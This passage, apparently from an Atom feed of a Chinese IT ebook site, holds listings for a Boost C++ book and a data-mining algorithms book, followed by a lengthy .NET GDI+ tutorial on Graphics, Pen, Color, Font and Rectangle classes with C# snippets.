sA/9lbqqf6IBGaqCWkdsyzR+yw5pVwoMX4pl/anwTY0Q2Zt3xydggOUf3HZAreby7Md8PcE5snNv2GUqXX9XZz39EzFjWORAs5ehWtFJ79v7sHz01p5PUqO1hKSDFxmSayf3hxicEGjgLDLz+vCuK8XEuirS1YkAEmCuZi/jsiTjRtQFXOs51+4sl4nbyiZsL5kI8IgYG4KBPbjwxZQU42ukRWpgn3Fmsnsc+dZj4A" alt=""></p>
<a id="more"></a>
<h2 id="在线阅读">在线阅读</h2><ul>
<li><a href="http://zh.highscore.de/cpp/boost/" target="_blank" rel="external">在线阅读</a></li>
</ul>
<h2 id="下载">下载</h2><p>暂无。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="data:image/webp;base64,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" alt=""></p>]]>
    
    </summary>
    
      <category term="boost" scheme="http://it-ebooks.flygon.net/tags/boost/"/>
    
      <category term="cpp" scheme="http://it-ebooks.flygon.net/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[数据挖掘十大算法详解]]></title>
    <link href="http://it-ebooks.flygon.net/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E5%8D%81%E5%A4%A7%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/"/>
    <id>http://it-ebooks.flygon.net/数据挖掘十大算法详解/</id>
    <published>2016-02-11T09:26:18.000Z</published>
    <updated>2016-02-11T09:27:44.069Z</updated>
    <content type="html"><![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/dm-algo-top10.jpg?build=1439249362341&amp;v=12.0.2" alt=""></p>
<a id="more"></a>
<h2 id="在线阅读">在线阅读</h2><ul>
<li><a href="https://www.gitbook.com/book/wizardforcel/dm-algo-top10/details" target="_blank" rel="external">在线阅读</a></li>
</ul>
<h2 id="下载">下载</h2><ul>
<li><a href="https://www.gitbook.com/download/pdf/book/wizardforcel/dm-algo-top10" target="_blank" rel="external">PDF格式</a></li>
<li><a href="https://www.gitbook.com/download/epub/book/wizardforcel/dm-algo-top10" target="_blank" rel="external">EPUB格式</a></li>
<li><a href="https://www.gitbook.com/download/mobi/book/wizardforcel/dm-algo-top10" target="_blank" rel="external">MOBI格式</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/dm-algo-top10.jpg?build=1439249362341&amp;v=12.0.2" alt=""></p>]]>
    
    </summary>
    
      <category term="数据挖掘" scheme="http://it-ebooks.flygon.net/tags/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[超全面的 .NET GDI+ 图形图像编程教程]]></title>
    <link href="http://it-ebooks.flygon.net/%E8%B6%85%E5%85%A8%E9%9D%A2%E7%9A%84-donet-gdip-%E5%9B%BE%E5%BD%A2%E5%9B%BE%E5%83%8F%E7%BC%96%E7%A8%8B%E6%95%99%E7%A8%8B/"/>
    <id>http://it-ebooks.flygon.net/超全面的-donet-gdip-图形图像编程教程/</id>
    <published>2016-02-11T04:45:51.000Z</published>
    <updated>2016-02-16T03:48:33.229Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>作者：孤影</p>
<p>来源：<a href="http://www.cnblogs.com/LonelyShadow/p/4162318.html" target="_blank" rel="external">超全面的 .NET GDI+ 图形图像编程教程</a></p>
</blockquote>
<h2 id="目录">目录</h2><ul>
<li>1 GDI+概述</li>
<li>2 Graphics类<ul>
<li>2.1 Graphics类的方法成员</li>
<li>2.2 引用命名空间</li>
</ul>
</li>
<li>3 常用画图对象<ul>
<li>3.1 Pen类</li>
<li>3.2 Color结构</li>
<li>3.3 Font类</li>
<li>3.4 Brush类</li>
<li>3.5 Rectangle类</li>
</ul>
</li>
<li>4 基本图形绘制举例<ul>
<li>4.1 画一个矩形</li>
<li>4.2 画一个弧</li>
<li>4.3 画线</li>
<li>4.4 画椭圆</li>
<li>4.5 输出文本</li>
<li>4.6 填充路径</li>
</ul>
</li>
<li>5 画刷和画刷类型<ul>
<li>5.1 SolidBrush(单色画刷)</li>
<li>5.2 HatchBrush(阴影画刷)</li>
<li>5.3 TextureBrush(纹理笔刷)</li>
<li>5.4 LinearGradientBrush 和 PathGradientBrush(渐变笔刷)<ul>
<li>5.4.1 LinearGradientBrush类</li>
<li>5.4.2 PathGradientBrush类<a id="more"></a></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>本篇主题内容是.NET GDI+图形图像编程系列的教程，不要被这个滚动条吓到，为了查找方便，我没有分开写，上面加了目录了，而且很多都是源码和图片~</p>
<h2 id="GDI+绘图基础">GDI+绘图基础</h2><p>编写图形程序时需要使用GDI(Graphics Device Interface，图形设备接口)。</p>
<p>从程序设计的角度看，GDI包括两部分：GDI对象和GDI函数。GDI对象定义了GDI函数使用的工具和环境变量；而GDI函数使用GDI对象绘制各种图形。</p>
<p>在C#中，进行图形程序编写时用到的是GDI+(Graphics Device Interface Plus，图形设备接口)版本，GDI+是GDI的进一步扩展，它使我们编程更加方便。</p>
<h2 id="1_GDI+概述">1 GDI+概述</h2><p>GDI+是微软在Windows 2000以后操作系统中提供的新的图形设备接口，其通过一套部署为托管代码的类来实现，这套类被称为GDI+的“托管类接口”。</p>
<p>GDI+主要提供了一下三类服务：</p>
<p>1.二维矢量图形：GDI+提供了存储图形基元自身信息的类(或结构体)、存储图形基元绘制方式信息的类以及实际进行绘制的类。</p>
<p>2.图像处理：大多数图片都难以划定为直线和曲线的集合，无法使用二维矢量图形方式进行处理。因此，GDI+为我们提供了Bitmap、Image等类，它们可用于显示、操作和奥村BMP、JPG、GIF等图像格式。</p>
<p>3.文字显示：GDI+支持使用各种字体、字号和样式来显示文本。</p>
<p>我们要进行图形编程，就必须先讲解Graphics类，同时我们还必须掌握Pen、Brush和Rectangle这几种类。</p>
<p>GDI+比GDI优越主要表现在两个方面：</p>
<p>1.GDI+通过提供新功能(例如：渐变画笔和Alpha混合)扩展了GDI的功能；</p>
<p>2.修订了编程模型，是图形编程更加简易灵活。</p>
<h2 id="2_Graphics类">2 Graphics类</h2><p>Graphics类封装一个GDI+绘图图面，提供将对象绘制到现实设备的方法，Graphics与特定的设备上下文关联。</p>
<p>画图方法都被包括在Graphics类中国，在画任何对象(例如：Circle Rectangle)时，我们首先要创建一个Graphics类实例，这个实例相当于建立了一块画布，有了画布才可以用各种画图方法进行绘图。</p>
<p>绘图程序的设计过程一般分为两个步骤：1.创建Graphics；2.使用Graphics对象的方法绘图、显示文本或处理图像。</p>
<p>通常我们使用下述三种方法来创建一个Graphics对象：</p>
<p>方法一：利用控件或窗体的Paint事件中的PaintEventArgs</p>
<p>在窗体或控件的Paint事件中接受对图形对象的引用，作为PaintEventArgs(PaintEventArgs指定绘制控件所用的Graphics)的一部分，在为控件创建绘制代码时，通常会使用此方法来获取对图形对象的引用。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//&#160;&#31383;&#20307;&#30340;Paint&#20107;&#20214;&#30340;&#21709;&#24212;&#26041;&#27861;&#10;private&#160;void&#160;Frm_Demo_Paint(object&#160;sender,&#160;PaintEventArgs&#160;e)&#10;&#123;&#10;&#160; &#160; Graphics&#160;_Graphics&#160;=&#160;e.Graphics;&#10;&#125;&#10;&#10;//&#160;&#20063;&#21487;&#20197;&#30452;&#25509;&#37325;&#36733;&#25511;&#20214;&#25110;&#31383;&#20307;&#30340;OnPaint&#26041;&#27861;&#10;protected&#160;override&#160;void&#160;OnPaint(PaintEventArgs&#160;e)&#10;&#123;&#10;&#160; &#160; Graphics&#160;_Graphics&#160;=&#160;e.Graphics;&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>Paint事件在重绘控件时发生。</p>
<p>方法二：调用某控件或窗体的CreateGraphics方法</p>
<p>调用某控件或窗体的CreateGraphics方法以获取对Graphics对象的引用，该对象表示该控件或窗体的绘图图面。</p>
<p>如果想在已存在的窗体或控件上绘图，通常会使用此方法，例如：</p>
<ol>
<li><code>Graphics _Graphics = this.CreateGraphics();    // 在当前窗体上创建Graphics对象</code></li>
</ol>
<p>方法三：调用Graphics类的FromImage静态方法</p>
<p>由从Image集成的任何对象创建Graphics对象。在需要更改已存在的图像时，通常会使用此方法。例如：</p>
<p>使用Graphics.FromImage()方法 创建Graphics对象</p>
<ol>
<li><code>Image img = Image.FromFile(“孤影.jpg”);   // 建立Image对象</code></li>
<li><code>Graphics _Graphics = Graphics.FromImage(img);   // 创建Graphics对象</code></li>
</ol>
<h3 id="2-1_Graphics类的方法成员">2.1 Graphics类的方法成员</h3><p>有了一个Graphics的对象引用后，就可以利用该对象的成员进行各种各样图形的绘制，下面表格列出了Graphics类的常用方法成员：</p>
<p>Graphics类常用方法成员</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>DrawArc</td>
<td>画弧</td>
<td>DrawBezier</td>
<td>画立体的贝尔塞曲线</td>
</tr>
<tr>
<td>DrawBeziers</td>
<td>画连续立体的贝尔塞曲线</td>
<td>DrawClosedCurve</td>
<td>画闭合曲线</td>
</tr>
<tr>
<td>DrawCurve</td>
<td>画曲线</td>
<td>DrawEllipse</td>
<td>画椭圆</td>
</tr>
<tr>
<td>DrawImage</td>
<td>画图像</td>
<td>DrawLine</td>
<td>画线</td>
</tr>
<tr>
<td>DrawPath</td>
<td>通过路径画线和曲线</td>
<td>DrawPie</td>
<td>画饼形</td>
</tr>
<tr>
<td>DrawPolygon</td>
<td>画多边形</td>
<td>DrawRectangle</td>
<td>画矩形</td>
</tr>
<tr>
<td>DrawString</td>
<td>绘制文字</td>
<td>FillEllipse</td>
<td>填充椭圆</td>
</tr>
<tr>
<td>FillPath</td>
<td>填充路径</td>
<td>FillPie</td>
<td>填充饼图</td>
</tr>
<tr>
<td>FillPolygon</td>
<td>填充多边形</td>
<td>FillRectangle</td>
<td>填充矩形</td>
</tr>
<tr>
<td>FillRectangles</td>
<td>填充矩形组</td>
<td>FillRegion</td>
<td>填充区域</td>
</tr>
</tbody>
</table>
<p>在.NET中，GDI+的所有绘图功能都包括在System、System.Drawimg、System.Drawimg.Imaging、System.Drawimg.Drawimg2D和System.Drawimg.Text等命名空间中，因此开始用GDI+类之前，需要先引用相应的命名空间。</p>
<h3 id="2-2_引用命名空间">2.2 引用命名空间</h3><p>在C#应用程序中使用using命令引用给定的命名空间或类，下面是一个C#应用程序引用命名空间的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">using&#160;System;&#10;using&#160;System.Collections.Generic;&#10;using&#160;System.Data;&#10;using&#160;System.ComponentModel;&#10;using&#160;System.Drawing;&#10;using&#160;System.Drawing.Drawing2D;&#10;using&#160;System.Drawing.Imaging;</span><br></pre></td></tr></table></figure>
<h2 id="3_常用画图对象">3 常用画图对象</h2><p>在创建了Graphics对象后，就可以用它开始绘图了，可以画线、填充图形、显示文本等等，其中主要用到的对象还有：</p>
<p>Pen：用来用patterns、colors或者bitmaps进行填充</p>
<p>Color：用来画线和多边形，包括矩形、圆和饼形</p>
<p>Font：用来给文字设置字体格式</p>
<p>Brush：用来描述颜色</p>
<p>Rectangle：矩形结构通常用来在窗体上画矩形</p>
<p>Point：描述一对有序的x,y两个坐标值</p>
<h3 id="3-1_Pen类">3.1 Pen类</h3><p>Pen类用来绘制指定宽度和样式的直线。使用DashStyle属性绘制几种虚线，可以使用各种各样填充样式(包括纯色和纹理)来填充Pen绘制的直线，填充模式取决于画笔或用作填充对象的纹理。</p>
<p>使用画笔时，需要先实例化一个画笔对象，主要有以下几种方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//&#160;&#29992;&#25351;&#23450;&#30340;&#39068;&#33394;&#23454;&#20363;&#21270;&#19968;&#21482;&#30011;&#31508;&#10;public&#160;Pen(Color);&#10;&#10;//&#160;&#29992;&#25351;&#23450;&#30340;&#30011;&#21047;&#23454;&#20363;&#21270;&#19968;&#21482;&#30011;&#31508;&#10;public&#160;Pen(Brush);&#10;&#10;//&#160;&#29992;&#25351;&#23450;&#30340;&#30011;&#21047;&#21644;&#23485;&#24230;&#23454;&#20363;&#21270;&#19968;&#21482;&#30011;&#31508;&#10;public&#160;Pen(Brush,&#160;float);&#10;&#10;//&#160;&#29992;&#25351;&#23450;&#30340;&#39068;&#33394;&#21644;&#23485;&#24230;&#23454;&#20363;&#21270;&#19968;&#21482;&#30011;&#31508;&#10;public&#160;Pen(Color,&#160;float);&#10;&#10;//&#160;&#23454;&#20363;&#21270;&#30011;&#31508;&#26684;&#24335;&#22914;&#19979;&#65306;&#10;Pen&#160;pen&#160;=&#160;new&#160;Pen(Color.Blue);&#10;//&#160;&#25110;&#32773;&#65306;&#10;Pen&#160;pen&#160;=&#160;new&#160;Pen(Color.Blue,&#160;100);</span><br></pre></td></tr></table></figure>
<p>Pen常用的属性如下：</p>
<p>Pen常用属性</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Alignment</td>
<td>获得或者设置画笔的对齐方式</td>
<td>Brush</td>
<td>获得或者设置画笔的属性</td>
</tr>
<tr>
<td>Color</td>
<td>获得或者设置画笔的颜色</td>
<td>Width</td>
<td>获得或者设置画笔的宽度</td>
</tr>
</tbody>
</table>
<h3 id="3-2_Color结构">3.2 Color结构</h3><p>在自然界中，颜色大都由透明度(A)和三基色(R,G,B)所组成。在GDI+中，通过Color结构封装对颜色的定义，Color结构中，除了提供(A,R,G,B)以外，还提供许多系统定义的颜色，如Pink(粉色)。另外，还提供许多静态成员，用户对颜色进行操作。</p>
<p>Color结构的基本属性如下表：</p>
<p>颜色的基本属性</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>获取此Color结构的Alpha分量值，取值(0~255)</td>
</tr>
<tr>
<td>R</td>
<td>获取此Color结构的红色分量值，取值(0~255)</td>
</tr>
<tr>
<td>G</td>
<td>获取此Color结构的绿色分量值，取值(0~255)</td>
</tr>
<tr>
<td>B</td>
<td>获取此Color结构的蓝色分量值，取值(0~255)</td>
</tr>
<tr>
<td>Name</td>
<td>获取此Color结构的名称，这将返回用户定义的颜色的名称或已知颜色的名称(如果该颜色是从某个名称创建的)。对于自定义的颜色，这将返回RGB值。</td>
</tr>
</tbody>
</table>
<p>Color结构的基本(静态)方法如下表：</p>
<p>颜色的基本方法</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>FromArgb</td>
<td>从四个8位的ARGB分量(Alpha、红色、绿色和蓝色)值创建Color结构</td>
</tr>
<tr>
<td>FromKnowColor</td>
<td>从指定饿预定义颜色创建一个Color结构</td>
</tr>
<tr>
<td>FromName</td>
<td>从预定义颜色的指定名称创建一个Color结构。</td>
</tr>
</tbody>
</table>
<p>Color结构变量可以通过已有颜色构造，也可以通过RGB建立，例如：</p>
<p>创建Color构造对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Color&#160;color1&#160;=&#160;Color.FromArgb(96,&#160;06,&#160;25);&#10;Color&#160;color2&#160;=&#160;Color.FromKnownColor(KnownColor.Blue);&#160;&#160;&#160;//&#160;KnowColor&#20026;&#26522;&#20030;&#31867;&#22411;&#10;Color&#160;color3&#160;=&#160;Color.FromName(&#34;LightBlue&#34;);</span><br></pre></td></tr></table></figure>
<p>在图像处理中一般需要获取或设置像素的颜色值，获取一幅图像的某个像素颜色值得具体步骤如下：</p>
<p>1.定义Bitmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bitmap&#160;bitmap&#160;=&#160;new&#160;Bitmap(&#34;D:\\&#23396;&#24433;\\LonelyShadow.bmp&#34;);</span><br></pre></td></tr></table></figure>
<p>2.定义一个颜色变量，把在指定位置所取得的像素值存入颜色变量中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Color&#160;color&#160;=&#160;new&#160;Color();&#10;color&#160;=&#160;bitmap.GetPixel(10,&#160;10);&#160;//&#160;&#33719;&#21462;&#27492;Bitmap&#20013;&#25351;&#23450;&#20687;&#32032;&#30340;&#39068;&#33394;</span><br></pre></td></tr></table></figure>
<p>3.将颜色值分解出单色分量值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int&#160;r,&#160;g,&#160;b;&#10;r&#160;=&#160;color.R;&#10;g&#160;=&#160;color.G;&#10;b&#160;=&#160;color.B;</span><br></pre></td></tr></table></figure>
<h3 id="3-3_Font类">3.3 Font类</h3><p>Font类定义特定文本格式，包括字体、字号和字形属性。Font类的常用构造函数是：</p>
<p><code>public Font(string 字体名, float 字号, FontStyle 字形)</code> 其中字号和字体为可选项</p>
<p><code>public Font(string 字体名, float 字号)</code> 其中字体名为Font的FontFamily的字符串表示形式</p>
<p>下面是定义一个F哦你团队相爱难过的示例代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FontFamily&#160;fontFamily&#160;=&#160;new&#160;FontFamily(&#34;Arial&#34;);&#10;Font&#160;font&#160;=&#160;new&#160;Font(fontFamily,&#160;16,&#160;FontStyle.Regular,&#160;GraphicsUnit.Pixel);</span><br></pre></td></tr></table></figure>
<p>字体常用属性如下表：</p>
<p>字体的常用属性</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Bold</td>
<td>是否为粗体</td>
<td>FontFamily</td>
<td>字体成员</td>
</tr>
<tr>
<td>Height</td>
<td>字体高</td>
<td>Italic</td>
<td>是否为斜体</td>
</tr>
<tr>
<td>Name</td>
<td>字体名称</td>
<td>Size</td>
<td>字体尺寸</td>
</tr>
<tr>
<td>SizeInPoints</td>
<td>获取此Font对象的字号，以磅为单位</td>
<td>Strikeout</td>
<td>是否有删除线</td>
</tr>
<tr>
<td>Style</td>
<td>字体类型</td>
<td>Underline</td>
<td>Unit</td>
</tr>
<tr>
<td>Unit</td>
<td>字体尺寸单位</td>
</tr>
</tbody>
</table>
<h3 id="3-4_Brush类">3.4 Brush类</h3><p>Brush类是一个抽象的基类，因此它不能被实例化，我们总是用它的派生类进行实例化一个画刷的对象，当我们对图形内部进行填充操作时就会用到画刷，关于画刷在 [1.5] 中有详细的讲解。</p>
<h3 id="3-5_Rectangle结构">3.5 Rectangle结构</h3><p>存储一组整数，共四个，表示一个矩形的位置和大小。</p>
<p>矩形结构通常用来在窗体上画矩形，除了利用它的构造函数矩形对象外，还可以利用Rectangle结构的属性成员，其属性成员如下表：</p>
<p>Rectangle结构属性</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Bottom</td>
<td>底端坐标</td>
<td>Height</td>
<td>矩形高</td>
</tr>
<tr>
<td>IsEmpty</td>
<td>测试矩形宽和高是否为0</td>
<td>Left</td>
<td>矩形左边坐标</td>
</tr>
<tr>
<td>Location</td>
<td>矩形的位置</td>
<td>Right</td>
<td>矩形右边坐标</td>
</tr>
<tr>
<td>Size</td>
<td>矩形尺寸</td>
<td>Top</td>
<td>矩形顶端坐标</td>
</tr>
<tr>
<td>Width</td>
<td>矩形宽</td>
<td>X</td>
<td>矩形左上角顶点X坐标</td>
</tr>
<tr>
<td>Y</td>
<td>矩形左上角顶点Y坐标</td>
</tr>
</tbody>
</table>
